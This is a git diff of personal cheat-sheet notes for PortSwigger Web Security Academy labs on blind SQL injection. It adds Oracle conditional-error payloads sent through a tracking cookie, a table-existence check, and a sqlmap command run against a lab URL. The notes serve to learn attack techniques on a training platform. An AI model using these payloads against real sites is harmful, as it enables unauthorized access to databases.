@@ -27,7 +27,9 @@ sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/fil
 **checking for blind sql vulneabilities:**
 Cookie: TrackingId=S0DitPIzii7Vv0TT'  --> put ' at the end of the cookies.
 
-**identifying blind injection is sql or non-sql.**
+
+**Blind SQL injection with conditional errors**
+
  TrackingId=xyz'||(SELECT '')||'   -> for sql
  TrackingId=xyz'||(SELECT '' FROM dual)||'   --> non-sql, its oracle.
 
@@ -41,12 +43,15 @@ its not a syntax error, its syntactical error.
 <img width="734" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/ee8790ee-3f75-4be0-a5d0-27e0a695cb7b">
 
 its oracle db
-
 <img width="742" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/2e046c41-11aa-4da4-9d12-34861f377ff9">
 
 
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'   -> if no error is returned users table exist
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   -> should return error as syntx is correct but condition is false.
+ <img width="744" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/e7eaaf67-bc40-4942-8d18-0c0af8c1ede4">
 
-
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'    ->  In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true
+<img width="748" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/ffabc5e3-e93d-46d2-96d2-529fa64735e3">
 
  
 ## Summary
